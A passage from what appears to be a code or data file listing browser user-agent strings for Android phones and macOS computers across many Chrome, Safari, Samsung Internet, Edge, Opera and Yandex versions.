    'Mozilla/5.0 (Linux; Android 12; moto g52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; MT2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX3360) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A336E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A716B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F721N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F936N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F936N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 EdgA/107.0.1418.35',
    'Mozilla/5.0 (Linux; Android 12; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G990E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 EdgA/107.0.1418.43',
    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N975W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S901E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S901N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; V2203) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; vivo 1920) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; LE2123) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.91 Mobile Safari/537.36 OPR/73.0.3788.68491',
    'Mozilla/5.0 (Linux; Android 13; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; Archos 97c Platinum) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; A0001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; LG-H870DS Build/OPR1.170623.032) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; MHA-AL00 Build/HUAWEIMHA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 BingWeb/6.9.6',
    'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; TECNO CA8S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; INE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; MRD-LX1F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 EdgA/96.0.1054.53',
    'Mozilla/5.0 (Linux; Android 9; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Y2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SM-G950N Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.232 Whale/1.0.0.0 Crosswalk/26.90.3.33 Mobile Safari/537.36 NAVER(inapp; search; 1010; 11.17.3)',
    'Mozilla/5.0 (Linux; Android 9; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; T5 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.1.75.00 SA/3 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 11; en-us; RMX3231 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/7.5.9',
    'Mozilla/5.0 (Linux; U; Android 8.0.0; zh-cn; Mi Note 2 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2408 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1079 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1081 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1145 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1146 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 05)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2408 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2410 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.114 Whale/3.17.145.12 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.24',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.28',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
